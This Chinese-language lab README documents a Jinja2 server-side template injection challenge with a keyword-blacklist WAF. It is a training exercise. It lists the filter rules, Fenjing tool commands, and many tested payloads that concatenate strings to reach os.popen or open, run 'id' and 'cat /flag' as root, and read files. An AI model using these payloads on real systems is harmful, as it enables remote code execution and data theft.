# 01 · Jinja2 关键词 WAF 绕过（原版挑战）

| | |
|---|---|
| 端口 | `8091`（`JINJA_WAF_PORT` 可改） |
| 引擎 | Jinja2 —— 裸 `jinja2.Environment`（渲染器 `jinja_plain`） |
| 关卡数 | 1（id `0`） |
| 过滤 | 关键词子串黑名单（13 项）+ 危险函数调用正则（24 条） |
| 依赖网络 | 否 |
| 回显 | 有（直接回显渲染结果） |
| flag | 容器内 `/flag`，由 entrypoint 从环境变量写入，不进镜像层 |

> 这是整个仓库的**起点**：`SSTI_labs_E` 最初那一版单题挑战，题面、过滤表与
> 注入上下文都按原样保留，所以网上那篇老 writeup 依然可复现。
> 与后面 13 关链靶场的区别在于：这里只有一关，但过滤是**一张真正的关键词表**，
> 机器枚举的成本远高于「逐关加一条规则」，因此它考的是**工具的用法**与
> **系统性的字符串构造功底**，而不是单点 trick。

## 这个靶场在教什么

1. **不可枚举过滤**：过滤不是「一个字符」，而是一张表。人工 fuzz 猜表很慢，
   正确姿势是用 `Fenjing` 的 `crack-keywords` 直接根据源码/词表反推 payload。
2. **语法面与语义面分离**：被禁的是「子串」，不是「能力」。`__` 写不出来，
   但 `'_'~'_'` 拼出来的就是 `__`；`os` 写不出来，但 `'o'~'s'` 就是 `os`。
3. **多个关键字叠加时的拆解顺序**：`flag`、`cat`、`?`、`os` 各被封一次，
   读文件这条路上每一段都要单独处理，这是它比 L12/L13 那种「符号黑名单」
   更贴近真实 WAF 的地方。

## 过滤规则（可执行的源）

```python
UNSAFE_KEYWORDS = [
    "__", "import", "os", "sys", "eval", "subprocess",
    "popen", "system", "%2f", "%2F", "flag", "cat", "?",
]
# 另有 24 条「危险函数调用」正则，例如 class\s*\( 、open\s*\( 、getattr\s*\(
```

两层均为**大小写不敏感**，命中任一层整段替换为字面量 `WAF`
（不是 403 —— 「被拦」与「载荷语法错」在反馈上必须可区分）。

### 关于「冗余正则」的说明

`app.py` 的 docstring 里写了这一点，这里展开：

- 原实现的危险正则列表里，有一大批条目是 `__class__` / `__bases__` /
  `__subclasses__` 这种 `__xxx__` 形式。但这些子串**已经被关键词表里的 `__` 整体拦截**，
  永远不可能先被正则命中 —— 也就是**不可达的冗余规则**。
- 本仓库保留的是其中**真正起作用**的那部分：`class(`、`globals(`、`locals(`、
  `getattr(`、`open(`、`eval(`、`exec(` … 这些「函数调用」形态。
  它们的价值在于堵住**不带下划线**的调用写法（例如 `getattr(x, 'y')`），
  这是 `__` 一条规则覆盖不到的。
- 但要注意它们仍然**可以被字符串拼接绕过**：正则匹配的是源码里连续的
  `getattr\s*\(`，而 `lipsum|attr('get')('o'~'s')` 里根本没有 `getattr` 这四个连续字母。
- 结论：**别把正则当第二道保险**。这条链线上，真正决定难度的只有关键词表里的
  `__`、`os`、`flag`、`cat` 四个词。

实际命中效果（在本文档对应的镜像上实测）：

| 载荷 | 结果 | 说明 |
|------|------|------|
| `{{7*7}}` | `49` | 通道正常 |
| `{{'__'}}` | `WAF` | `__` 被拦 |
| `{{'_'~'_'}}` | `__` | **拼接后得到 `__`，源码里没有 `__` 子串** |
| `{{'globals'}}` | `globals` | 单个 `globals` 不在词表里 |
| `{{'attr'}}` | `attr` | `attr` 单独放行 |
| `{{'getattr('}}` | `WAF` | 命中正则 `getattr\s*\(` |
| `{{'open'}}` | `open` | `open` 只在正则里（要带 `(` 才命中） |
| `{{'o'~'s'}}` | `os` | `os` 被拦，拼接可过 |
| `{{'ca'~'t'}}` | `cat` | `cat` 被拦，拼接可过 |
| `{{'fla'~'g'}}` | `flag` | `flag` 被拦，拼接可过 |

## 参考解 A：工具路线（推荐，也是原作者 writeup 的路线）

Fenjing 的 `crack-keywords` 子命令专门处理「关键词黑名单」型 WAF：
它把词表读进来，然后在**不出现这些子串**的前提下，用字符串拼接 / `|attr` /
`|__getitem__` 等语法面重新拼出等价表达式。

```bash
# 1) 直接用题目源码（Fenjing 会自己从中提取关键词表）
python -m fenjing crack-keywords \
    --keywords-file labs/01-jinja-waf-fenjing/app.py \
    --command 'id' --python-subversion 11

# Windows 上必须加 PYTHONUTF8=1：否则 Fenjing 用 GBK 读 app.py，
# 遇到源码里的中文注释会直接 UnicodeDecodeError 崩掉。
#   PowerShell:  $env:PYTHONUTF8=1

# 2) 把关键词表写成一个纯文本文件（每行一个词）也可以，
#    此时建议显式指定分析模式与替换策略：
python -m fenjing crack-keywords --keywords-file kw.txt \
    --command 'cat /flag' --python-subversion 11 --detect-mode accurate
```

### 生成结果与实测

下面是**本次在容器上实际跑出来的**（`labs/01-jinja-waf-fenjing` 镜像，
`STATIC_FLAG=flag{doc_probe}`，`POST /api/render`，`mode=god`）：

```jinja2
# --command 'id'  → accurate 模式
{{((ez|attr('_''_eq_''_'))['_''_globals_''_']['s''ys'].modules['o''s']['p''open']('id')).read()}}

# --command 'id'  → fast 模式
{{cycler|attr('n''ext')|attr('_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_')|attr('_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_')('o'+'s')|attr('p'+'o'+'p'+'e'+'n')('i'+'d')|attr('r'+'e'+'a'+'d')()}}

# --command 'cat /flag'
{{((_114|attr('_''_eq_''_'))['_''_globals_''_']['s''ys'].modules['o''s']['p''open']('galf/ tac'[::-1])).read()}}
```

实测输出（逐条经 `/api/render` 执行）：

| 生成命令 | 观察到的输出 |
|----------|--------------|
| `--command 'id'`（accurate） | `uid=0(root) gid=0(root) groups=0(root)\n` |
| `--command 'id'`（fast） | `uid=0(root) gid=0(root) groups=0(root)\n` |
| `--command 'cat /flag'` | `flag{doc_probe}`（`flag_found: true`） |

三个技巧值得记下来：

- `'_''_'` 是 Jinja 的**相邻字符串字面量隐式拼接**（等价于 `'_'~'_'`），
  拼出 `__` 却不让 `__` 出现在源码里。
- `sys.modules['os']` 之所以能用，是因为 `sys` 反正在 `jinja2.utils` 的
  `__globals__` 里；`modules` 字典键就是模块名，拼接后就是 `os`。
- `'galf/ tac'[::-1]` 把 `cat /flag` **倒过来写再切片反转** —— 这是绕过
  「`cat` 和 `flag` 同时被禁」最省事的写法，比逐个 `chr()` 拼短得多。

> 要点：Fenjing 直接拿 `app.py` 当词表时会**连中文注释一起读**，
> Windows 默认 GBK 下会崩；`PYTHONUTF8=1` 或改用纯文本词表都能解决。
> 另外 `--python-subversion` 需要显式给（本镜像为 Python 3.11）。

## 参考解 B：手搓路线（`~` 拼接 + `|attr` / `[]`）

核心只有一句话：**凡是黑名单里的词，都不要以连续子串的形式出现在模板源码里。**

路由三选一（都可用，按「顺手程度」排序）：

```jinja2
# 起点：lipsum 是 jinja2.Environment 的默认全局，裸 Environment 里也有
{{lipsum}}                       → <function generate_lorem_ipsum at 0x...>

# ① 下标取全局属性（不需要 |attr）
{{lipsum['_'~'_'~'globals'~'_'~'_']}}

# ② |attr 过滤器取属性（|attr 本身不在黑名单里）
{{lipsum|attr('_'~'_'~'globals'~'_'~'_')}}
```

拿到 `jinja2.utils` 的 `__globals__` 之后（实测返回的是完整 globals 字典，
里面 `'os': <module 'os' (frozen)>`）：

```jinja2
# ③ 取 os：'o'~'s' 拼出来
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']}}     → <module 'os' (frozen)>

# ④ popen 同理：'pop'~'en'（词表里禁的是 popen 这个连续子串）
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('id')['read']()}}
                                                   → uid=0(root) gid=0(root) groups=0(root)
```

### 读 `/flag`：两个被禁词的拆解

`flag` 与 `cat` 都单独被禁，所以命令与路径都要拼：

```jinja2
# ✅ 实测输出 flag{doc_probe}
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')['read']()}}

# 等价的 |attr 写法（read 也拆成 're'~'ad'，虽然 read 本来没被禁）
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')|attr('re'~'ad')()}}

# 完全绕开外部命令：走 __builtins__ 里的 open（'op'~'en' 躲开 open( 正则）
{{lipsum['_'~'_'~'globals'~'_'~'_']['_'~'_'~'builtins'~'_'~'_']['op'~'en']('/fla'~'g')['read']()}}

# /usr/bin/cat 那条路走不通：/usr/bin/cat 里的 cat 仍是子串，必须拆
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('/usr/bin/ca'~'t'~' '~'/fla'~'g')['read']()}}
```

上述四条都已实测，输出均为 `flag{doc_probe}`（`flag_found: true`）。

### 手搓路线的两个坑

1. **`chr()` 不能用**：本靶场用 `jinja_plain`（裸 `jinja2.Environment` +
   `name/version/challenge/numbers/string/dict/list/...` 这组业务变量），
   **模板命名空间里没有 `chr`**。实测 `{{chr(47)}}` 报
   `UndefinedError: 'chr' is undefined`。想用 `chr` 得先从
   `__globals__['__builtins__']` 里取（而 `builtins` 里又含 `__`，同样要拼）。
   所以这里**不要**照搬 Mako/Tornado 靶场那套 `chr()` 思路。
2. **`getattr(` 是正则、`|attr(` 不是**：正则 `getattr\s*\(` 匹配的是「连续的
   `getattr` 紧跟左括号」，`|attr(` 前面是竖线，不会命中。这就是为什么
   `|attr` 在这题里能直接用，而 `getattr(x,'y')` 会被拦。

### 一份可以直接粘贴的「最小可读版」

```jinja2
{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')['read']()}}
```

## 直接调 API

```bash
# 场景型靶场也提供统一契约接口（见 docs/API.md 第 5 节）
curl -s localhost:8091/api/lab-info | jq '{id,title,levels:[.levels[].title]}'

curl -s -X POST localhost:8091/api/render \
     -H 'Content-Type: application/json' \
     -d '{"level":"0","mode":"god","template":"{{7*7}}"}' | jq

# 手搓链条（注意 shell 里单引号与 Jinja 的冲突，推荐用文件投递，见下）
curl -s -X POST localhost:8091/api/render \
     -H 'Content-Type: application/json' \
     --data-binary @payload.json | jq
```

`payload.json`（把 payload 写进文件可以彻底躲开 shell 引号问题）：

```json
{"level":"0","mode":"god","template":"{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')['read']()}}"}
```

> 提示：练习模式（默认）会把命中过滤的载荷回显为 `WAF`；`mode=god` 才会多返回
> `template_after_waf` / `raw_output` / `error` / `exception_type` / `source_class`。

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
docker build -t ssti-frontend:local frontend
#    （仓库里脚本化版本为 scripts/build-frontend.sh / build-frontend.ps1，
#      本仓库当前**尚未提供**该脚本，见 README 的「已知问题」）

# 2) 起靶场
cd labs/01-jinja-waf-fenjing
docker compose up --build            # → http://127.0.0.1:8091

# 或在仓库根目录一次起全部（根 compose 目前仍是旧版单题编排，见 README）
```

## 出题提示

- 本关用 `jinja_plain` 是**刻意的**：它保证 `server.py` 时代的老 writeup 还能跑。
  一旦改成 Flask 的 `render_template_string`，`config` / `request` / `url_for`
  会一并出现，题目的入口就完全变了（那是 `02-jinja-chain` 的形态）。
- 关键词表是**大小写不敏感**的，所以 `OS`、`Flag` 这类变体过不去；
  但反过来，`|attr` 这类「不写关键词」的语法面永远是开着的 —— 这是设计上留的口子。
- 想加难度可以往词表里补 `'_'`、`'~'`、`'|'`；但那会把这题从「工具题」
  变成「不可解题」，加之前请先用上面的手搓 payload 验一遍。
